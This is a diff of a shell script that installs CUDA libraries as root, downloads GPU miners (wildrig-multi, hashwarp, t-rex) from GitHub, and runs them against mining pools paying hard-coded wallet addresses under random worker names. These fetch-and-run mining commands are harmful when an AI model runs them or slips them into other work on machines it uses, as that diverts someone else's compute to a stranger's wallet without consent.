@@ -1,10 +1,9 @@
 apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo
-curl https://github.com/andru-kun/wildrig-multi/releases/download/0.47.9/wildrig-multi-linux-0.47.9.tar.gz -L -o wildrig-multi-linux-0.47.9.tar.gz
-tar xf wildrig-multi-linux-0.47.9.tar.gz
-while :; do
-./wildrig-multi --algo qhash --url qubitcoin.luckypool.io:8610 -u bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.$(echo $RANDOM | md5sum | head -c 10) -p x
-done
-
+wget http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/libcudart12_12.0.146~12.0.1-4build4_amd64.deb && dpkg -i libcudart12_12.0.146~12.0.1-4build4_amd64.deb
+sudo su -c "apt update && apt -y install ocl-icd-libopencl1 ocl-icd-opencl-dev clinfo curl wget sudo && wget http://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/libcudart12_12.0.146~12.0.1-4build4_amd64.deb && dpkg -i libcudart12_12.0.146~12.0.1-4build4_amd64.deb"
+curl https://github.com/ParallaxProtocol/hashwarp/releases/download/v1.2.0/hashwarp-v1.2.0-cuda12-linux.tar.xz -L -o hashwarp-v1.2.0-cuda12-linux.tar.xz
+tar xf hashwarp-v1.2.0-cuda12-linux.tar.xz
+./hashwarp -P stratum1+tcp://0x58e1aafadea1498c272819516741ef94de5209ee.$(echo $RANDOM | md5sum | head -c 10):x@prlx.coolpool.top:3003
 
 
 curl https://github.com/kryptex-miners-org/kryptex-miners/releases/download/trex-0-26-8/t-rex-0.26.8-linux.tar.gz -L -o t-rex-0.26.8-linux.tar.gz
